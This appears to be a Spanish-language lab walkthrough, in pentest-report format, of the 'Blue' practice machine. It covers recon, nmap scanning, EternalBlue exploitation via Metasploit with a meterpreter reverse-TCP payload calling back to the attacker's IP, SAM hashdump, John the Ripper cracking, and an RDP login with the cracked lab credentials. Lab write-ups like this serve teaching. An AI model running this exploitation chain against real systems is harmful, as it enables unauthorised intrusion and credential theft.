---
layout: default
---

# MÃ¡quina BLUE

# Reporte de Pentesting - Fase 1: Reconocimiento

## 1.1 Resumen Ejecutivo

Se validÃ³ la disponibilidad del objetivo mediante protocolos de control y se intentÃ³ una identificaciÃ³n de servicios web inicial. Los resultados sugieren un entorno basado en Windows con el puerto 80 cerrado.

## 1.2 Actividades Realizadas y Comandos

Para esta fase se ejecutaron las siguientes herramientas de recolecciÃ³n de informaciÃ³n:

1. **VerificaciÃ³n de Conectividad y TTL:**
    - **Comando:** `ping -c 4 <IP_OBJETIVO>`
    - **PropÃ³sito:** Confirmar estado del host y estimar el OS mediante el Time To Live (TTL).
    - **Resultado:** TTL=126 (Compatible con Windows).
2. **Fingerprinting de TecnologÃ­as Web:**
    - **Comando:** `whatweb <http://<IP_OBJETIVO>`
    - **PropÃ³sito:** Identificar CMS, servidores y librerÃ­as en el puerto estÃ¡ndar HTTP.
    - **Resultado:** `Connection refused`. El puerto 80 no estÃ¡ aceptando conexiones.

## 1.3 Resultados Obtenidos

| ParÃ¡metro | Valor |
| --- | --- |
| **IP Objetivo** | 10.130.128.214 |
| **Estado** | Operativo |
| **OS Estimado** | Windows |
| **Puerto 80** | Cerrado/Refused |

![image.png](image.png)

# Reporte de Pentesting - Fase 2: Escaneo y EnumeraciÃ³n

## 2.1 Resumen Ejecutivo

Se realizÃ³ un escaneo exhaustivo de puertos y servicios sobre el objetivo. Se identificÃ³ un sistema Windows 7 desactualizado con servicios crÃ­ticos de red (SMB y RDP) expuestos.

## 2.2 Actividades Realizadas y Comandos

Para esta fase se ejecutÃ³ un escaneo agresivo para detecciÃ³n de versiones y scripts:

1. **Escaneo Completo de Puertos y Servicios:**
    - **Comando:** `sudo nmap -p- --open -sS -Pn -sV -sC --min-rate 5000 <IP_OBJETIVO>`
    - **PropÃ³sito:** Identificar todos los puertos abiertos, versiones de software y configuraciones por defecto.
    - **Resultado:** DetecciÃ³n de SMB (445) y RDP (3389) sobre Windows 7 SP1.

## 2.3 Hallazgos (Puertos Abiertos)

| Puerto | Servicio | VersiÃ³n | Observaciones |
| --- | --- | --- | --- |
| 135/tcp | msrpc | Microsoft Windows RPC | Servicio de comunicaciones |
| 139/tcp | netbios-ssn | Microsoft Windows netbios-ssn | ResoluciÃ³n de nombres |
| 445/tcp | microsoft-ds | Windows 7 Pro 7601 SP1 | **CrÃ­tico:** SMB sin firmas requeridas |
| 3389/tcp | rdp | Microsoft Terminal Services | RDP activo (JON-PC) |

## 2.4 Evidencias

> 
> 
> 
> ![image.png](image%201.png)
> 

# Reporte de Pentesting - Fase 3: AnÃ¡lisis de Vulnerabilidades

## 3.1 Resumen Ejecutivo

Tras la fase de enumeraciÃ³n, se procediÃ³ a la validaciÃ³n de vectores de ataque especÃ­ficos. Se ha confirmado que el objetivo es vulnerable al exploit **MS17-010 (EternalBlue)**, lo que permite a un atacante no autenticado tomar el control total del sistema con privilegios mÃ¡ximos.

## 3.2 Actividades Realizadas y Comandos

Para confirmar la vulnerabilidad sin comprometer la estabilidad del sistema, se ejecutaron las siguientes acciones:

1. **Escaneo de Vulnerabilidades con Scripts de Nmap (NSE):**
    - **Comando:** `nmap -p445 --script smb-vuln-ms17-010 <IP_OBJETIVO>`
    - **PropÃ³sito:** Verificar si el servicio SMBv1 del objetivo es susceptible al ataque EternalBlue (CVE-2017-0143).
    - **Resultado:** **VULNERABLE**. Se identificÃ³ un riesgo de factor **ALTO**.
2. **EnumeraciÃ³n de Recursos SMB (Null Session):**
    - **Comando:** `smbclient -L //<IP_OBJETIVO> -N`
    - **PropÃ³sito:** Intentar listar recursos compartidos de forma anÃ³nima.
    - **Resultado:** `Anonymous login successful`, aunque no se detectaron recursos compartidos adicionales accesibles mediante este mÃ©todo.

## 3.3 Hallazgos Identificados

| Vulnerabilidad | ID CVE | Severidad | Impacto |
| --- | --- | --- | --- |
| **MS17-010 (EternalBlue)** | CVE-2017-0143 | CrÃ­tica | EjecuciÃ³n Remota de CÃ³digo (RCE) como SYSTEM |

## 3.4 Evidencias

> 
> 
> 
> ![image.png](image%202.png)
> 

# Reporte de Pentesting - Fase 4: ExplotaciÃ³n Controlada

## 4.1 Resumen Ejecutivo

Tras confirmar que el sistema objetivo (Windows 7 SP1) es vulnerable a **MS17-010 (EternalBlue)**, se procediÃ³ a realizar una explotaciÃ³n controlada utilizando el framework Metasploit. El objetivo fue establecer una sesiÃ³n remota con privilegios elevados para validar el impacto de la vulnerabilidad.

## 4.2 Actividades Realizadas y Comandos

La explotaciÃ³n se llevÃ³ a cabo siguiendo estos pasos tÃ©cnicos:

1. **SelecciÃ³n del Exploit:**
    - **Comando:** `use exploit/windows/smb/ms17_010_eternalblue`
    - **DescripciÃ³n:** Se seleccionÃ³ el mÃ³dulo especÃ­fico para el desbordamiento de memoria en el protocolo SMBv1.
2. **ConfiguraciÃ³n del Entorno de Red:**
    - **Comando:** `set RHOSTS <IP_OBJETIVO>` (IP de la VÃ­ctima)
    - **Comando:** `set LHOST 192.168.143.6` (IP del Atacante - tun0)
    - **Payload:** Se utilizÃ³ por defecto `windows/x64/meterpreter/reverse_tcp`.
3. **EjecuciÃ³n del Ataque:**
    - **Comando:** `exploit`
    - **Resultado:** El exploit logrÃ³ realizar el "overwrite" de la memoria con Ã©xito (`ETERNALBLUE overwrite completed successfully`) y enviÃ³ el 'stage' del payload.
4. **VerificaciÃ³n de Identidad:**
    - **Comando:** `getuid`
    - **Resultado:** `Server username: NT AUTHORITY\\SYSTEM`.

## 4.3 Resultados del Acceso

| ParÃ¡metro | Detalle |
| --- | --- |
| **Nivel de Privilegio** | **SYSTEM** (MÃ¡ximo privilegio en Windows) |
| **Estabilidad** | SesiÃ³n de Meterpreter activa |
| **Persistencia inicial** | Confirmada mediante la lista de procesos (`ps`) |

## 4.4 Evidencias (Capturas de Pantalla)

> **Captura 04: EjecuciÃ³n del exploit y confirmaciÃ³n de privilegios SYSTEM**
> 
> 
> ![image.png](image%203.png)
> 

# 5. Fase de ExplotaciÃ³n y Compromiso de Credenciales

## 5.1 Resumen de la IntrusiÃ³n

Tras la fase de enumeraciÃ³n, se confirmÃ³ que el objetivo era vulnerable al exploit **MS17-010 (EternalBlue)**. La ejecuciÃ³n de este exploit permitiÃ³ saltar todas las barreras de autenticaciÃ³n iniciales, otorgando una sesiÃ³n de comandos con el privilegio mÃ¡s alto existente en Windows: **NT AUTHORITY\SYSTEM**.

## 5.2 ExtracciÃ³n de la Base de Datos SAM

Con el control total del sistema, se procediÃ³ a extraer los secretos almacenados en la **Security Account Manager (SAM)**. Este paso es crÃ­tico para identificar a los usuarios reales y sus niveles de acceso.

- **Comando Ejecutado:** `hashdump`
- **Hash NTLM de Jon:** `ffb43f0de35be4d9917ac0cc8ad57f8d`
- **ObservaciÃ³n:** El hash del Administrador (`31d6cfe...`) indica una contraseÃ±a vacÃ­a, lo que sugiere que la cuenta estÃ¡ deshabilitada o no se utiliza.

## 5.3 Cracking de ContraseÃ±as (John the Ripper)

Para obtener la contraseÃ±a en texto claro y poder suplantar la identidad del usuario de forma legÃ­tima, se realizÃ³ un ataque de diccionario offline.

1. **Herramienta:** John the Ripper.
2. **Diccionario:** `rockyou.txt`.
3. **Resultado:** El hash fue quebrado en menos de un segundo debido a la baja complejidad de la clave.
    - **Usuario:** Jon
    - **ContraseÃ±a:** `alqfna22`

> 
> 
> 
> ![image.png](image%204.png)
> 

## 5.4 ValidaciÃ³n de Identidad vÃ­a RDP

Para demostrar el impacto real de la vulnerabilidad, se utilizÃ³ la contraseÃ±a obtenida para iniciar una sesiÃ³n de **Escritorio Remoto (RDP)**. Esto permite al atacante interactuar con la interfaz grÃ¡fica, ver documentos personales y realizar acciones que un simple comando de consola no permitirÃ­a.

- **Herramienta de acceso:** `rdesktop` / `xfreerdp`
- **Credenciales validadas:** `Jon` : `alqfna22`
- Comando: `rdesktop -u Jon -p alqfna22 -g 1280x720 -P -z 10.130.128.214`
- **Resultado:** Acceso exitoso al entorno de escritorio de **JON-PC**.

> 
> 
> 
> ![image.png](image%205.png)
> 

## 5.5 ConclusiÃ³n de Privilegios

Aunque accedimos inicialmente como **SYSTEM** (el nivel "SÃºper Root"), la obtenciÃ³n de la contraseÃ±a de **Jon** garantiza:

1. **Persistencia:** Podemos volver a entrar incluso si el exploit deja de funcionar.
2. **Privilegios de Administrador:** El usuario Jon pertenece al grupo de administradores, permitiendo la gestiÃ³n total del equipo de forma visual.
